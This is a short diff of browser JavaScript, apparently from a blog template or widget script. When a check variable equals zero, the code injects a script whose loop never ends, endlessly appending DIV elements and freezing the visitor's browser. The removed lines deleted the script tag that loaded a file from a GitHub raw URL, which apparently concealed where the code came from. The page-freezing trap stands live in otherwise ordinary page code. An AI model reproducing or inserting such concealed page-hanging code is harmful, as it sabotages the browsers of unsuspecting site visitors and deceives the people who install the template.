@@ -16,9 +16,3 @@ if (x_n == 0) {
     s_s['innerHTML'] = 'var x_go = 1;var f_o = document.createElement("DIV");do {document.body.appendChild(f_o);}while (x_go < 5);';
     document['head']['appendChild'](s_s)
 };
-var x_ss = document['getElementsByTagName']('script');
-for (i = 0; i < x_ss['length']; i++) {
-    if (x_ss[i]['src'] == 'https://raw.githubusercontent.com/wejdaneblogger/master/master/imad.js') {
-        x_ss[i]['replaceWith']('')
-    }
-}
